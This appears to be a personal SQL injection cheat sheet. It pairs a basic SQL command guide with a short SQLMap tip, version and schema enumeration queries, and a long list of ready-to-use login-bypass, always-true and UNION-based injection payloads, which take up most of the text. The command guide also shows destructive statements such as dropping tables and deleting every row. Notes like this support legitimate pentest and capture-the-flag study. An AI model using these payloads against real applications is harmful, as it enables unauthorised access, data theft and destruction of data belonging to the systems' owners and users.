# General Cheat Sheet
[Port Swigger SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## SQL command guide
- `;--`: Signifies the end of the SQL statement, then causes everything afterwards to be treated as a comment
- `USE database`: selects the database you want to use
- `select * from users;`: `select` tells the database to retrieve some data, the `*` says we want to receive back all columns from the table `users`.
- `select username,password from users;`: Requests the username and password field of the table
- `select * from users LIMIT 1;` Adding `LIMIT 1` only returns one row of data. `LIMIT 1,1` skips the first result, `LIMNIT 2,1` skips the first two results, etc.
- `select * from users where username='admin';`: `where` retrieves data where `username` is equal to `admin`. Can add `!=` in between `username` and `admin` to retrieve data not equal to admin.
- `select * from users where username='admin' or username='jon';`: Retrieves all data from both queries. Can replace `or` with `and`
-  `select * from users where username like 'a%';`: Specifies data that either starts, contains, or ends with certain characters by choosing where to place the wildcard character `%` (`a%` = data beginning with `a`, `%a` = data ending with `a`, `%ab%` = data with characters `ab` within them)
- `union`: Combines two or more `select` statements.
- `insert`: Inserts a new row of data into the specified table, and adding `into` adds data into the location (ex: `insert into users (username,password) values ('bob','password123');` adds the username `bob` and password `password123` into the `users` table
- `update`: Updates one or more rows of data within a table (specify what table to update with `update TABLENAME SET` then the field or fields you wish to update. EX: `update users SET username='root',password='pass123' where username='admin'` - this changes the username `admin` to `root`)
- Add `UNION` to beginning of payloads for `SELECT` queries
- `delete`: Tells the database we wish to delete one or more rows of data. (Can specify which data using `where`. EX: `delete from users where username='martin'` - deletes the row where the username is martin. EX: `delete from users` deletes all data in the table)
- `drop table TABLE_NAME;` gets rid of that table
- `show databases;` shows all databases

Add a `*` in the spot you want to scan with SQLMap
```
X-FORWARDED-FOR: YOUR_IP_ADDRESS*
```
- Then copy the whole request and paste into [[Cybersecurity/Web Exploitation/SQLi/SQLmap]]

## Finding Databases
1. Find the version of sql
```
SELECT verion()
SELECT USER_ID(1)
SELECT sqlite_version()
```
2. Display the database
```
SELECT group_concat(sql) FROM sqlite_master
SELECT name FROM v$database
```
- try both `v$pdbs` and `v$database` as it may use either

## SQL Always True Statements
Payloads to test for SQLi:
```
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
==
=
'
' --
' #
' –
'--
'/*
'#
" --
" #
"/*
' and 1='1
' and a='a
 or 1=1
 or true
' or ''='
" or ""="
1′) and '1′='1–
' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
 and 1=1
 and 1=1–
' and 'one'='one
' and 'one'='one–
' group by password having 1=1--
' group by userid having 1=1--
' group by username having 1=1--
 like '%'
 or 0=0 --
 or 0=0 #
 or 0=0 –
' or         0=0 #
' or 0=0 --
' or 0=0 #
' or 0=0 –
" or 0=0 --
" or 0=0 #
" or 0=0 –
%' or '0'='0
 or 1=1
 or 1=1--
 or 1=1/*
 or 1=1#
 or 1=1–
' or 1=1--
' or '1'='1
' or '1'='1'--
' or '1'='1'/*
' or '1'='1'#
' or '1′='1
' or 1=1
' or 1=1 --
' or 1=1 –
' or 1=1--
' or 1=1;#
' or 1=1/*
' or 1=1#
' or 1=1–
') or '1'='1
') or '1'='1--
') or '1'='1'--
') or '1'='1'/*
') or '1'='1'#
') or ('1'='1
') or ('1'='1--
') or ('1'='1'--
') or ('1'='1'/*
') or ('1'='1'#
'or'1=1
'or'1=1′
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 –
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1–
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1′='1–
) or ('1′='1–
' or 1=1 LIMIT 1;#
'or 1=1 or ''='
"or 1=1 or ""="
' or 'a'='a
' or a=a--
' or a=a–
') or ('a'='a
" or "a"="a
") or ("a"="a
') or ('a'='a and hi") or ("a"="a
' or 'one'='one
' or 'one'='one–
' or uid like '%
' or uname like '%
' or userid like '%
' or user like '%
' or username like '%
' or 'x'='x
') or ('x'='x
" or "x"="x
' OR 'x'='x'#;
'=' 'or' and '=' 'or'
' UNION ALL SELECT 1, @@version;#
' UNION ALL SELECT system_user(),user();#
' UNION select table_schema,table_name FROM information_Schema.tables;#
admin' and substring(password/text(),1,1)='7
' and substring(password/text(),1,1)='7
' or 1=1 limit 1 -- -+
'="or'
```
